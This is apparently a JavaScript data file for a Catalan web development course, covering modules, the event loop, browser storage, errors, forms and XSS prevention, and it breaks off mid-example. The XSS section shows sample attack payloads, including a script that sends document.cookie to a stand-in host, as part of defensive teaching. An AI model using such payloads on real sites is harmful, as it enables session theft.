export default {
  title: "Eines modernes i bones pràctiques",
  description:
    "Mòduls ES6 en projectes reals, event loop, storage, errors, seguretat, testing, npm i introducció a TypeScript.",
  chapters: [
    {
      slug: "moduls-projectes",
      title: "Mòduls ES6 aplicats a projectes reals",
      summary:
        "Organitzar un projecte en mòduls reutilitzables: imports, exports, re-exports i càrrega dinàmica.",
      goals: [
        "Estructurar un projecte en mòduls independents.",
        "Fer re-exports i barril (barrel files).",
        "Usar importació dinàmica <code>import()</code> per a code splitting.",
        "Entendre com els bundlers (Vite, Webpack) gestionen els mòduls.",
      ],
      sections: [
        {
          title: "Estructura de projecte amb mòduls",
          body: `
            <p>Un projecte modern organitza el codi en mòduls per responsabilitat. Cada fitxer exporta allò que li pertany i importa el que necessita.</p>
            <pre><code>src/
  lib/
    api.js        ← funcions per cridar l'API
    format.js     ← formatadors de dades
    storage.js    ← localStorage helpers
  components/
    button.js
    modal.js
  pages/
    home.js
  index.js        ← punt d'entrada</code></pre>
          `,
          lang: "js",
          code: `// lib/format.js
export function formatMoneda(valor, divisa = 'EUR') {
  return new Intl.NumberFormat('ca-ES', {
    style: 'currency',
    currency: divisa,
  }).format(valor);
}

export function formatData(data) {
  return new Intl.DateTimeFormat('ca-ES', {
    day: 'numeric', month: 'long', year: 'numeric',
  }).format(new Date(data));
}

export function truncar(text, max = 100) {
  return text.length > max ? text.slice(0, max) + '…' : text;
}

// lib/api.js
const BASE = 'https://api.exemple.com';

export async function getProductes() {
  const res = await fetch(\`\${BASE}/productes\`);
  if (!res.ok) throw new Error(\`Error \${res.status}\`);
  return res.json();
}

export async function getProducte(id) {
  const res = await fetch(\`\${BASE}/productes/\${id}\`);
  if (!res.ok) throw new Error(\`Producte no trobat\`);
  return res.json();
}

// pages/home.js
import { getProductes } from '../lib/api.js';
import { formatMoneda, truncar } from '../lib/format.js';

const productes = await getProductes();
productes.forEach(p => {
  console.log(truncar(p.nom, 30), formatMoneda(p.preu));
});`,
          codeTitle: "estructura-moduls.js",
        },
        {
          title: "Barrel files i re-exports",
          body: `
            <p>Un <strong>barrel file</strong> (normalment <code>index.js</code>) re-exporta tots els mòduls d'una carpeta per simplificar els imports.</p>
            <p>En lloc d'importar de cada fitxer individual, importes tot des d'un punt central.</p>
          `,
          lang: "js",
          code: `// lib/index.js  ← barrel file
export { formatMoneda, formatData, truncar } from './format.js';
export { getProductes, getProducte } from './api.js';
export { guardar, llegir, eliminar } from './storage.js';

// Ara en lloc de:
// import { formatMoneda } from '../lib/format.js';
// import { getProductes } from '../lib/api.js';

// Podem fer:
import { formatMoneda, getProductes } from '../lib/index.js';
// o fins i tot:
import { formatMoneda, getProductes } from '../lib';`,
          codeTitle: "barrel.js",
        },
        {
          title: "Importació dinàmica i code splitting",
          body: `
            <p><code>import()</code> retorna una promesa. Permet carregar mòduls sota demanda (quan l'usuari fa una acció) en lloc de carregar-ho tot al principi. Els bundlers com Vite ho converteixen en chunks separats automàticament.</p>
          `,
          lang: "js",
          code: `// Càrrega lazy d'un mòdul pesat
const btnEditor = document.getElementById('btn-editor');

btnEditor.addEventListener('click', async () => {
  // El mòdul es carrega QUAN l'usuari clica, no abans
  const { iniciarEditor } = await import('./editor.js');
  iniciarEditor('#contenidor');
});

// Importació condicional
async function carregarGrafic(tipus) {
  let modul;
  if (tipus === 'barres') {
    modul = await import('./grafics/barres.js');
  } else if (tipus === 'sectorial') {
    modul = await import('./grafics/sectorial.js');
  } else {
    modul = await import('./grafics/linia.js');
  }
  return modul.default; // la classe o funció exportada per defecte
}

// Precarregar (sense bloquejar)
// Vite i Webpack optimitzen automàticament
const promesa = import('./modul-pesat.js'); // comença a descarregar
// ... més endavant:
const modul = await promesa; // ja estava carregat`,
          codeTitle: "dynamic-import.js",
        },
      ],
      exercise: {
        brief: `<p>Organitza el codi d'una petita app de llista de tasques en mòduls:</p>
<ul>
  <li><code>lib/storage.js</code>: funcions <code>guardarTasques(array)</code> i <code>carregarTasques()</code> usant localStorage</li>
  <li><code>lib/tasques.js</code>: funcions pures <code>afegirTasca(llista, text)</code>, <code>marcarFeta(llista, id)</code>, <code>eliminarTasca(llista, id)</code></li>
  <li><code>ui/renderitzar.js</code>: funció <code>renderitzar(llista, contenidor)</code> que genera HTML</li>
  <li><code>index.js</code>: importa tot i coordina l'app</li>
</ul>`,
        hint: `<p>Les funcions de <code>tasques.js</code> han de ser pures (no modifiquen l'array original, retornen un nou array). Usa <code>crypto.randomUUID()</code> o <code>Date.now()</code> per als IDs.</p>`,
        solution: `<pre><code>// lib/storage.js
export const guardarTasques = (t) => localStorage.setItem('tasques', JSON.stringify(t));
export const carregarTasques = () => JSON.parse(localStorage.getItem('tasques') || '[]');

// lib/tasques.js
export const afegirTasca = (ll, text) => [...ll, { id: Date.now(), text, feta: false }];
export const marcarFeta = (ll, id) => ll.map(t => t.id === id ? {...t, feta: !t.feta} : t);
export const eliminarTasca = (ll, id) => ll.filter(t => t.id !== id);</code></pre>`,
      },
    },

    {
      slug: "event-loop-js",
      title: "Event Loop, microtasks i macrotasks",
      summary:
        "Entendre com JavaScript executa codi asíncron: l'event loop, la call stack, la task queue i la microtask queue.",
      goals: [
        "Descriure el funcionament de l'event loop.",
        "Distingir microtasks (Promises) de macrotasks (setTimeout).",
        "Predir l'ordre d'execució de codi asíncron.",
        "Evitar bloquejar el thread principal.",
      ],
      sections: [
        {
          title: "La call stack i el thread únic",
          body: `
            <p>JavaScript és <strong>single-threaded</strong>: executa una cosa a la vegada. La <strong>call stack</strong> registra quines funcions s'estan executant. Quan crides una funció, s'afegeix a la pila; quan acaba, es treu.</p>
            <p>Si una funció tarda molt (loop infinit, operació pesada), <strong>bloqueja tot</strong>: l'UI es congela, no es processen events.</p>
          `,
          lang: "js",
          code: `// Exemple de call stack
function c() { console.log('C'); }
function b() { c(); console.log('B'); }
function a() { b(); console.log('A'); }

a();
// Ordre d'execució:
// Stack: [a] → [a, b] → [a, b, c]
// c() → "C" → treu c
// Stack: [a, b] → b continua → "B" → treu b
// Stack: [a] → a continua → "A" → treu a
// Output: C, B, A

// Bloqueig del thread (MAL)
function operacioPesada() {
  const fi = Date.now() + 2000; // 2 segons
  while (Date.now() < fi) {}  // ← BLOQUEJA l'UI 2 segons
  console.log('Fet');
}
// Millor: Web Workers per a càlculs pesats`,
          codeTitle: "call-stack.js",
        },
        {
          title: "Macrotasks i microtasks",
          body: `
            <p>El codi asíncron s'encua en dues cues separades:</p>
            <ul>
              <li><strong>Macrotask queue</strong>: <code>setTimeout</code>, <code>setInterval</code>, events del DOM, <code>fetch</code> (callbacks).</li>
              <li><strong>Microtask queue</strong>: <code>Promise.then/catch/finally</code>, <code>queueMicrotask()</code>, <code>MutationObserver</code>.</li>
            </ul>
            <p><strong>Regla clau:</strong> després de cada macrotask, el motor buidarà <em>totes</em> les microtasks pendents abans d'agafar la següent macrotask.</p>
          `,
          lang: "js",
          code: `console.log('1 - síncron');

setTimeout(() => console.log('2 - macrotask (setTimeout 0)'), 0);

Promise.resolve()
  .then(() => console.log('3 - microtask (Promise)'));

queueMicrotask(() => console.log('4 - microtask (queueMicrotask)'));

console.log('5 - síncron');

// OUTPUT (ordre garantit):
// 1 - síncron
// 5 - síncron
// 3 - microtask (Promise)      ← microtasks primer!
// 4 - microtask (queueMicrotask)
// 2 - macrotask (setTimeout 0) ← macrotask al final

// Exemple amb async/await (sugar syntax de Promises):
async function demo() {
  console.log('A - dins async, abans await');
  await Promise.resolve();
  console.log('C - reanuda com a microtask');
}

demo();
console.log('B - síncron, després de cridar demo()');
// Output: A, B, C`,
          codeTitle: "event-loop.js",
        },
        {
          title: "requestAnimationFrame i Web Workers",
          body: `
            <p><code>requestAnimationFrame(cb)</code> executa el callback just abans del pròxim repintat del navegador (~16ms a 60fps). Ideal per a animacions suaus.</p>
            <p>Els <strong>Web Workers</strong> permeten executar codi en un thread separat, evitant bloquejar l'UI per a càlculs pesats.</p>
          `,
          lang: "js",
          code: `// requestAnimationFrame: animació suau
let inici = null;
const element = document.getElementById('caixa');

function animar(timestamp) {
  if (!inici) inici = timestamp;
  const progres = timestamp - inici;

  element.style.transform = \`translateX(\${Math.min(progres / 5, 300)}px)\`;

  if (progres < 1500) {
    requestAnimationFrame(animar); // pròxim frame
  }
}
requestAnimationFrame(animar);

// Web Worker: càlcul pesat sense bloquejar
// worker.js (fitxer separat):
// self.onmessage = ({ data }) => {
//   let resultat = 0;
//   for (let i = 0; i < data; i++) resultat += Math.sqrt(i);
//   self.postMessage(resultat);
// };

// main.js:
const worker = new Worker('./worker.js');
worker.postMessage(10_000_000); // enviar feina
worker.onmessage = ({ data }) => {
  console.log('Resultat del worker:', data);
  worker.terminate();
};`,
          codeTitle: "raf-workers.js",
        },
      ],
      exercise: {
        brief: `<p>Prediu i explica l'ordre d'execució d'aquest codi:</p>
<pre><code>console.log('A');
setTimeout(() => console.log('B'), 0);
Promise.resolve().then(() => {
  console.log('C');
  Promise.resolve().then(() => console.log('D'));
});
setTimeout(() => console.log('E'), 0);
console.log('F');</code></pre>
<p>Després implementa una funció <code>esperarMs(ms)</code> que retorni una Promise que es resolgui després de <code>ms</code> mil·lisegons, i una funció <code>executarSeqüencialment(tasques)</code> que executi un array de funcions async una darrere l'altra.</p>`,
        hint: `<p>L'output és: A, F, C, D, B, E. Recorda: síncron → microtasks → macrotask → microtasks → macrotask... Per a <code>esperarMs</code>: <code>return new Promise(resolve => setTimeout(resolve, ms))</code>.</p>`,
        solution: `<pre><code>// A, F (síncron) → C, D (microtasks) → B, E (macrotasks)

const esperarMs = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function executarSeqüencialment(tasques) {
  const resultats = [];
  for (const tasca of tasques) {
    resultats.push(await tasca());
  }
  return resultats;
}</code></pre>`,
      },
    },

    {
      slug: "storage-web",
      title: "LocalStorage, SessionStorage i IndexedDB",
      summary:
        "Persistir dades al navegador: des de valors simples amb localStorage fins a bases de dades complexes amb IndexedDB.",
      goals: [
        "Distingir localStorage, sessionStorage i cookies.",
        "Crear un wrapper tipat per a localStorage.",
        "Fer servir IndexedDB per a dades estructurades.",
        "Gestionar errors i límits de quota.",
      ],
      sections: [
        {
          title: "localStorage i sessionStorage",
          body: `
            <p>Ambdós emmagatzemen parelles clau-valor en format text. La diferència és la durada:</p>
            <ul>
              <li><strong>localStorage</strong>: persisteix fins que s'esborra manualment.</li>
              <li><strong>sessionStorage</strong>: s'esborra quan es tanca la pestanya.</li>
            </ul>
            <p>Límit aproximat: 5-10 MB per origen. Sempre síncron (bloqueja).</p>
          `,
          lang: "js",
          code: `// API bàsica (igual per sessionStorage)
localStorage.setItem('nom', 'Anna');
localStorage.getItem('nom');       // 'Anna'
localStorage.removeItem('nom');
localStorage.clear();              // esborra tot
localStorage.length;               // nombre d'entrades
localStorage.key(0);               // primera clau

// Serialitzar objectes (cal JSON)
const preferencies = { tema: 'fosc', idioma: 'ca', mida: 16 };
localStorage.setItem('prefs', JSON.stringify(preferencies));
const prefs = JSON.parse(localStorage.getItem('prefs'));

// Wrapper tipat i segur
function storage(clau) {
  return {
    get(defecte = null) {
      try {
        const val = localStorage.getItem(clau);
        return val === null ? defecte : JSON.parse(val);
      } catch { return defecte; }
    },
    set(valor) {
      try { localStorage.setItem(clau, JSON.stringify(valor)); return true; }
      catch (e) {
        if (e.name === 'QuotaExceededError') console.warn('localStorage ple!');
        return false;
      }
    },
    remove() { localStorage.removeItem(clau); },
  };
}

// Ús:
const tasques = storage('tasques');
tasques.set([{ id: 1, text: 'Aprendre JS', feta: false }]);
console.log(tasques.get([])); // array o [] si no existeix`,
          codeTitle: "localstorage.js",
        },
        {
          title: "Detectar canvis entre pestanyes",
          body: `
            <p>L'event <code>storage</code> es dispara quan un altre context (altra pestanya del mateix origen) modifica el localStorage. Permet sincronitzar l'estat entre pestanyes.</p>
          `,
          lang: "js",
          code: `// Escoltar canvis de localStorage des d'altres pestanyes
window.addEventListener('storage', (event) => {
  console.log('Clau canviada:', event.key);
  console.log('Valor antic:', event.oldValue);
  console.log('Valor nou:', event.newValue);
  console.log('URL origen:', event.url);

  if (event.key === 'sessio' && event.newValue === null) {
    // L'usuari ha tancat sessió en una altra pestanya
    window.location.href = '/login';
  }
});

// Nota: l'event NO es dispara a la mateixa pestanya que fa el canvi`,
          codeTitle: "storage-event.js",
        },
        {
          title: "IndexedDB: base de dades al navegador",
          body: `
            <p>IndexedDB és una base de dades NoSQL al navegador: permet emmagatzemar grans quantitats de dades estructurades, amb índexs i transaccions. L'API nativa és verbose; normalment s'usa la biblioteca <strong>idb</strong> (wrapper de Promises).</p>
          `,
          lang: "js",
          code: `// Amb la biblioteca idb (npm install idb)
import { openDB } from 'idb';

// Obrir/crear la base de dades
const db = await openDB('la-meva-app', 1, {
  upgrade(db) {
    // Crear l'objecte de store (taula)
    const store = db.createObjectStore('tasques', {
      keyPath: 'id',
      autoIncrement: true,
    });
    // Crear índexs per cercar
    store.createIndex('per-data', 'data');
    store.createIndex('per-categoria', 'categoria');
  },
});

// Afegir registres
await db.add('tasques', {
  text: 'Aprendre IndexedDB',
  feta: false,
  data: new Date(),
  categoria: 'aprenentatge',
});

// Llegir tots els registres
const totes = await db.getAll('tasques');

// Llegir per índex
const avui = new Date();
const dAvui = await db.getAllFromIndex('tasques', 'per-data', avui);

// Actualitzar
await db.put('tasques', { id: 1, text: 'Aprendre IndexedDB', feta: true });

// Eliminar
await db.delete('tasques', 1);`,
          codeTitle: "indexeddb.js",
        },
      ],
      exercise: {
        brief: `<p>Implementa un sistema de preferències d'usuari persistent amb localStorage que:</p>
<ul>
  <li>Desi: tema (clar/fosc), idioma (ca/es/en), mida de font (12-24px), color accent (hex)</li>
  <li>Carregui les preferències en iniciar la pàgina i les apliqui com a variables CSS a <code>:root</code></li>
  <li>Gestioni errors de quota i de JSON malformat</li>
  <li>Sincronitzi canvis entre pestanyes via l'event <code>storage</code></li>
  <li>Permeti reset a valors per defecte</li>
</ul>`,
        hint: `<p>Aplica les preferències a CSS amb: <code>document.documentElement.style.setProperty('--font-size', prefs.midaFont + 'px')</code>. Per al tema: afegeix/treu la classe <code>dark</code> a <code>document.documentElement</code>.</p>`,
        solution: `<pre><code>const DEFAULT_PREFS = { tema: 'clar', idioma: 'ca', midaFont: 16, accent: '#0070f3' };

function carregarPrefs() {
  try { return { ...DEFAULT_PREFS, ...JSON.parse(localStorage.getItem('prefs') || '{}') }; }
  catch { return { ...DEFAULT_PREFS }; }
}

function aplicarPrefs(prefs) {
  const r = document.documentElement;
  r.dataset.theme = prefs.tema;
  r.style.setProperty('--font-size', prefs.midaFont + 'px');
  r.style.setProperty('--color-accent', prefs.accent);
}

function desarPrefs(prefs) {
  try { localStorage.setItem('prefs', JSON.stringify(prefs)); }
  catch (e) { console.warn('No s\'han pogut desar:', e); }
}

window.addEventListener('storage', e => {
  if (e.key === 'prefs') aplicarPrefs(carregarPrefs());
});

aplicarPrefs(carregarPrefs());</code></pre>`,
      },
    },

    {
      slug: "gestio-errors-debug",
      title: "Gestió d'errors i debugging avançat",
      summary:
        "Capturar, classificar i gestionar errors de forma robusta, i depurar codi amb les DevTools.",
      goals: [
        "Distingir tipus d'errors (TypeError, RangeError, etc.).",
        "Crear errors personalitzats amb classes.",
        "Gestionar errors en Promises i async/await.",
        "Depurar eficientment amb les DevTools de Chrome.",
      ],
      sections: [
        {
          title: "Tipus d'errors i try/catch/finally",
          body: `
            <p>JavaScript té diversos tipus d'errors integrats. El bloc <code>try/catch/finally</code> permet capturar-los i gestionar-los:</p>
          `,
          table: {
            head: ["Tipus", "Quan apareix"],
            rows: [
              ["Error", "Classe base, genèrica"],
              ["TypeError", "Operació amb tipus incorrecte (null.prop)"],
              ["RangeError", "Valor fora del rang (array de mida -1)"],
              ["ReferenceError", "Variable no definida"],
              ["SyntaxError", "Codi malformat (JSON.parse d'un string invàlid)"],
              ["URIError", "decodeURIComponent d'una URI malformada"],
            ],
          },
          lang: "js",
          code: `// try/catch bàsic
try {
  const dades = JSON.parse('{invalid json}');
} catch (error) {
  if (error instanceof SyntaxError) {
    console.error('JSON malformat:', error.message);
  } else {
    throw error; // re-lança si no és el nostre error
  }
} finally {
  // S'executa sempre (tant si hi ha error com si no)
  console.log('Netejant recursos...');
}

// Distingir tipus d'errors
function dividir(a, b) {
  if (typeof a !== 'number' || typeof b !== 'number') {
    throw new TypeError('Els arguments han de ser números');
  }
  if (b === 0) {
    throw new RangeError('No es pot dividir per zero');
  }
  return a / b;
}

try {
  console.log(dividir(10, 0));
} catch (e) {
  if (e instanceof TypeError) console.error('Tipus incorrecte:', e.message);
  else if (e instanceof RangeError) console.error('Rang invàlid:', e.message);
  else throw e;
}`,
          codeTitle: "try-catch.js",
        },
        {
          title: "Errors personalitzats i jerarquia",
          body: `
            <p>Pots crear les teves pròpies classes d'error per donar context específic de l'aplicació, afegir informació extra i fer <code>instanceof</code> precís.</p>
          `,
          lang: "js",
          code: `// Errors personalitzats
class AppError extends Error {
  constructor(missatge, codi) {
    super(missatge);
    this.name = 'AppError';
    this.codi = codi;
  }
}

class ApiError extends AppError {
  constructor(missatge, statusHttp) {
    super(missatge, 'API_ERROR');
    this.name = 'ApiError';
    this.status = statusHttp;
  }
}

class ValidationError extends AppError {
  constructor(missatge, camp) {
    super(missatge, 'VALIDATION_ERROR');
    this.name = 'ValidationError';
    this.camp = camp;
  }
}

// Ús
async function getUsuari(id) {
  const res = await fetch(\`/api/usuaris/\${id}\`);
  if (res.status === 404) throw new ApiError('Usuari no trobat', 404);
  if (!res.ok) throw new ApiError(\`Error del servidor: \${res.status}\`, res.status);
  return res.json();
}

try {
  const user = await getUsuari(99);
} catch (e) {
  if (e instanceof ApiError && e.status === 404) {
    console.warn('Usuari no existeix');
  } else if (e instanceof ApiError) {
    console.error('Error de xarxa:', e.message);
  } else {
    throw e;
  }
}`,
          codeTitle: "custom-errors.js",
        },
        {
          title: "Errors en Promises i async/await",
          body: `
            <p>Els errors no capturats en Promises disparen l'event <code>unhandledrejection</code>. Sempre gestiona els errors en cadenes de Promises i funcions async.</p>
          `,
          lang: "js",
          code: `// Capturar errors globals de Promises no gestionades
window.addEventListener('unhandledrejection', (event) => {
  console.error('Promise no gestionada:', event.reason);
  event.preventDefault(); // evita el log per defecte del navegador
});

// Errors en async/await
async function carregarDades() {
  try {
    const [usuari, productes] = await Promise.all([
      fetch('/api/usuari').then(r => {
        if (!r.ok) throw new ApiError('Error usuari', r.status);
        return r.json();
      }),
      fetch('/api/productes').then(r => {
        if (!r.ok) throw new ApiError('Error productes', r.status);
        return r.json();
      }),
    ]);
    return { usuari, productes };
  } catch (e) {
    if (e instanceof ApiError) {
      // Gestió específica
      return { error: e.message, usuari: null, productes: [] };
    }
    throw e; // errors inesperats: re-lança
  }
}

// Helper: wrapping d'async per evitar try/catch repetitiu
async function safe(fn, ...args) {
  try {
    return [null, await fn(...args)];
  } catch (error) {
    return [error, null];
  }
}

const [err, dades] = await safe(carregarDades);
if (err) console.error('Error:', err.message);
else console.log('Dades:', dades);`,
          codeTitle: "async-errors.js",
        },
      ],
      exercise: {
        brief: `<p>Crea un sistema de fetch robust per a una API amb les funcions:</p>
<ul>
  <li><code>apiFetch(url, opcions)</code>: wrapper de fetch que llança <code>ApiError</code> per a respostes no-OK i errors de xarxa</li>
  <li><code>apiGet(url)</code>, <code>apiPost(url, dades)</code>, <code>apiPut(url, dades)</code>, <code>apiDelete(url)</code></li>
  <li>Gestió de timeouts (si no respon en 10s, cancel·la)</li>
  <li>Reintentar automàticament (1 reintent) en errors de xarxa (no en errors 4xx)</li>
</ul>`,
        hint: `<p>Per al timeout usa <code>AbortController</code>: <code>const controller = new AbortController(); setTimeout(() => controller.abort(), 10000); fetch(url, { signal: controller.signal })</code>. Per a reintentar, atrapa l'error, comprova si és de xarxa (no <code>ApiError</code>) i torna a cridar la funció un cop.</p>`,
        solution: `<pre><code>class ApiError extends Error {
  constructor(msg, status) { super(msg); this.status = status; }
}

async function apiFetch(url, opcions = {}, intents = 2) {
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 10000);
  try {
    const res = await fetch(url, { ...opcions, signal: ctrl.signal });
    clearTimeout(tid);
    if (!res.ok) throw new ApiError(\`HTTP \${res.status}\`, res.status);
    return res.json();
  } catch (e) {
    clearTimeout(tid);
    if (e instanceof ApiError || intents <= 1) throw e;
    return apiFetch(url, opcions, intents - 1);
  }
}

const apiGet = (url) => apiFetch(url);
const apiPost = (url, d) => apiFetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(d) });</code></pre>`,
      },
    },

    {
      slug: "formularis-validacio-js",
      title: "Formularis i validació amb JavaScript",
      summary:
        "Validació client robusta, gestió d'estats de formulari i enviament async.",
      goals: [
        "Implementar validació en temps real amb feedback accessible.",
        "Gestionar l'estat del formulari (loading, error, èxit).",
        "Enviar formularis amb fetch (async) sense recàrrega.",
        "Prevenir enviaments dobles i gestionar errors de servidor.",
      ],
      sections: [
        {
          title: "Patró de validació modular",
          body: `
            <p>Un patró net per a validació de formularis: un objecte de regles per camp, una funció de validació i una funció de renderització d'errors.</p>
          `,
          lang: "js",
          code: `// Regles de validació per camp
const regles = {
  nom: [
    { test: v => v.trim().length > 0, msg: 'El nom és obligatori' },
    { test: v => v.trim().length >= 2, msg: 'Mínim 2 caràcters' },
    { test: v => v.trim().length <= 50, msg: 'Màxim 50 caràcters' },
  ],
  email: [
    { test: v => v.trim().length > 0, msg: 'El correu és obligatori' },
    { test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v), msg: 'Format de correu invàlid' },
  ],
  contrasenya: [
    { test: v => v.length >= 8, msg: 'Mínim 8 caràcters' },
    { test: v => /[A-Z]/.test(v), msg: 'Ha de contenir una majúscula' },
    { test: v => /[0-9]/.test(v), msg: 'Ha de contenir un número' },
  ],
};

// Validar un camp
function validarCamp(nom, valor) {
  const campRegles = regles[nom] || [];
  for (const regla of campRegles) {
    if (!regla.test(valor)) return regla.msg;
  }
  return null; // null = vàlid
}

// Mostrar/amagar error
function mostrarError(nomCamp, missatge) {
  const input = document.getElementById(nomCamp);
  const errorEl = document.getElementById(\`error-\${nomCamp}\`);
  if (missatge) {
    input.setAttribute('aria-invalid', 'true');
    errorEl.textContent = missatge;
    errorEl.hidden = false;
  } else {
    input.removeAttribute('aria-invalid');
    errorEl.hidden = true;
  }
}

// Validació en temps real
document.querySelectorAll('[data-valida]').forEach(input => {
  input.addEventListener('blur', () => {
    const error = validarCamp(input.name, input.value);
    mostrarError(input.name, error);
  });
});`,
          codeTitle: "validacio-modular.js",
        },
        {
          title: "Enviament async i gestió d'estats",
          body: `
            <p>Enviar formularis amb <code>fetch</code> permet mostrar feedback sense recarregar la pàgina. Cal gestionar tres estats: <em>carregant</em>, <em>error</em> i <em>èxit</em>.</p>
          `,
          lang: "js",
          code: `const form = document.getElementById('form-contacte');
const btnEnviar = form.querySelector('[type="submit"]');
const missatgeExit = document.getElementById('missatge-exit');
const missatgeError = document.getElementById('missatge-error');

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  // Validar tots els camps
  const camps = ['nom', 'email', 'missatge'];
  let formulariValid = true;
  camps.forEach(camp => {
    const input = form.elements[camp];
    const error = validarCamp(camp, input.value);
    mostrarError(camp, error);
    if (error) formulariValid = false;
  });

  if (!formulariValid) {
    // Enfocar el primer camp amb error
    form.querySelector('[aria-invalid="true"]').focus();
    return;
  }

  // Estat: carregant
  btnEnviar.disabled = true;
  btnEnviar.textContent = 'Enviant...';
  btnEnviar.setAttribute('aria-busy', 'true');
  missatgeError.hidden = true;

  try {
    const dades = Object.fromEntries(new FormData(form));
    const res = await fetch('/api/contacte', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dades),
    });

    if (!res.ok) {
      const error = await res.json();
      throw new Error(error.missatge || 'Error del servidor');
    }

    // Estat: èxit
    form.reset();
    missatgeExit.hidden = false;
    missatgeExit.focus();
  } catch (error) {
    // Estat: error
    missatgeError.textContent = error.message;
    missatgeError.hidden = false;
    missatgeError.focus();
  } finally {
    // Sempre restaurar el botó
    btnEnviar.disabled = false;
    btnEnviar.textContent = 'Enviar';
    btnEnviar.removeAttribute('aria-busy');
  }
});`,
          codeTitle: "form-async.js",
        },
        {
          title: "FormData i enviament de fitxers",
          body: `
            <p><code>FormData</code> és l'objecte ideal per a formularis: recull tots els camps automàticament, gestiona fitxers i es pot serialitzar a JSON o enviar directament.</p>
          `,
          lang: "js",
          code: `// FormData: recull tots els camps del formulari
const form = document.getElementById('form');
const dades = new FormData(form);

// Accedir a valors
dades.get('nom');           // valor del camp "nom"
dades.getAll('interessos'); // array per a múltiples valors (checkboxes)

// Convertir a objecte (sense fitxers)
const objecte = Object.fromEntries(dades);

// Afegir dades extra
dades.append('timestamp', new Date().toISOString());

// Enviar amb fitxers (multipart/form-data)
// NO posar 'Content-Type': fetch ho gestiona automàticament
const res = await fetch('/api/pujada', {
  method: 'POST',
  body: dades, // FormData directament, no JSON.stringify
});

// Preview d'imatge abans de pujar
const inputFitxer = document.getElementById('avatar');
const preview = document.getElementById('preview');

inputFitxer.addEventListener('change', () => {
  const fitxer = inputFitxer.files[0];
  if (!fitxer) return;

  // Validar tipus i mida
  if (!fitxer.type.startsWith('image/')) {
    alert('Selecciona una imatge');
    return;
  }
  if (fitxer.size > 2 * 1024 * 1024) { // 2MB
    alert('La imatge no pot superar els 2MB');
    return;
  }

  // Mostrar preview
  const url = URL.createObjectURL(fitxer);
  preview.src = url;
  preview.onload = () => URL.revokeObjectURL(url); // alliberar memòria
});`,
          codeTitle: "formdata-fitxers.js",
        },
      ],
      exercise: {
        brief: `<p>Crea un formulari de registre complet amb:</p>
<ul>
  <li>Camps: nom, email, contrasenya, confirmar contrasenya, acceptar termes (checkbox)</li>
  <li>Validació en temps real (a l'event blur) amb regles per cada camp</li>
  <li>Validació creuada: contrasenya i confirmació han de coincidir</li>
  <li>Enviament async que simula una API (setTimeout 1500ms) i pot fallar aleatòriament</li>
  <li>Estats visuals: loading (botó desactivat), error (missatge), èxit (formulari amagat, missatge)</li>
  <li>Accessibilitat: aria-invalid, aria-describedby, focus al primer error</li>
</ul>`,
        hint: `<p>Per a la validació creuada de contrasenyes, afegeix un listener al camp de confirmació que comprovi <code>confirma.value !== contrasenya.value</code>. Per simular l'API: <code>await new Promise((res, rej) => setTimeout(() => Math.random() > 0.3 ? res() : rej(new Error('Error del servidor')), 1500))</code>.</p>`,
        solution: `<pre><code>const simularApi = () => new Promise((res, rej) =>
  setTimeout(() => Math.random() > 0.3 ? res() : rej(new Error('Error del servidor')), 1500)
);

form.addEventListener('submit', async e => {
  e.preventDefault();
  if (!validarTot()) return;
  btnEnviar.disabled = true;
  try {
    await simularApi();
    form.hidden = true;
    document.getElementById('exit').hidden = false;
  } catch(e) {
    mostrarErrorGlobal(e.message);
  } finally {
    btnEnviar.disabled = false;
  }
});</code></pre>`,
      },
    },

    {
      slug: "seguretat-xss",
      title: "Seguretat bàsica: XSS, sanitització i DOM segur",
      summary:
        "Prevenir atacs XSS (Cross-Site Scripting) i manipular el DOM de forma segura sense injectar HTML no sanititzat.",
      goals: [
        "Entendre com funciona un atac XSS.",
        "Usar <code>textContent</code> en lloc d'<code>innerHTML</code> per a text d'usuari.",
        "Sanititzar HTML amb DOMPurify.",
        "Conèixer altres vectors d'atac: CSP, CSRF.",
      ],
      sections: [
        {
          title: "Què és XSS i per què és perillós",
          body: `
            <p>Un atac <strong>XSS (Cross-Site Scripting)</strong> injecta codi JavaScript maliciós a la pàgina a través de dades d'usuari no sanititzades. El codi s'executa al navegador de la víctima amb accés al DOM, cookies i localStorage.</p>
            <p>Un atacant pot: robar cookies de sessió, redirigir l'usuari, modificar el contingut de la pàgina, fer peticions en nom de l'usuari.</p>
          `,
          lang: "js",
          code: `// VULNERABLE: innerHTML amb dades d'usuari
const nomUsuari = new URLSearchParams(location.search).get('nom');
// Si l'URL és: ?nom=<script>fetch('https://mal.com?c='+document.cookie)</script>
// Això executa el script de l'atacant!
document.getElementById('salutacio').innerHTML = \`Hola, \${nomUsuari}!\`;

// SEGUR: textContent escapa automàticament
document.getElementById('salutacio').textContent = \`Hola, \${nomUsuari}!\`;
// El text es mostra literal, mai s'executa com a HTML

// VULNERABLE: concatenar HTML amb dades d'usuari
function mostrarComentari(comentari) {
  llista.innerHTML += \`<li>\${comentari.text}</li>\`; // ← PERILL
}

// SEGUR: crear nodes DOM
function mostrarComentari(comentari) {
  const li = document.createElement('li');
  li.textContent = comentari.text; // escapat automàticament
  llista.appendChild(li);
}`,
          codeTitle: "xss-basico.js",
        },
        {
          title: "Sanititzar HTML amb DOMPurify",
          body: `
            <p>De vegades sí que cal renderitzar HTML d'usuari (editors de text enriquit, markdown renderitzat). En aquest cas, usa <strong>DOMPurify</strong> per eliminar tags i atributs perillosos.</p>
          `,
          lang: "js",
          code: `// npm install dompurify
import DOMPurify from 'dompurify';

// HTML potencialment perillós
const htmlUsuari = \`
  <h2>Títol vàlid</h2>
  <p onclick="alert('XSS')">Paràgraf amb event inline</p>
  <script>robar_cookies()</script>
  <img src="x" onerror="alert('XSS')">
  <a href="javascript:alert('XSS')">Link</a>
  <strong>Text en negreta (OK)</strong>
\`;

// Sanititzar: elimina scripts, events inline, javascript: URLs
const htmlNet = DOMPurify.sanitize(htmlUsuari);
// Resultat: <h2>Títol vàlid</h2><p>Paràgraf amb event inline</p><strong>Text en negreta (OK)</strong>

document.getElementById('contingut').innerHTML = htmlNet;

// Configuració avançada
const htmlEstricte = DOMPurify.sanitize(htmlUsuari, {
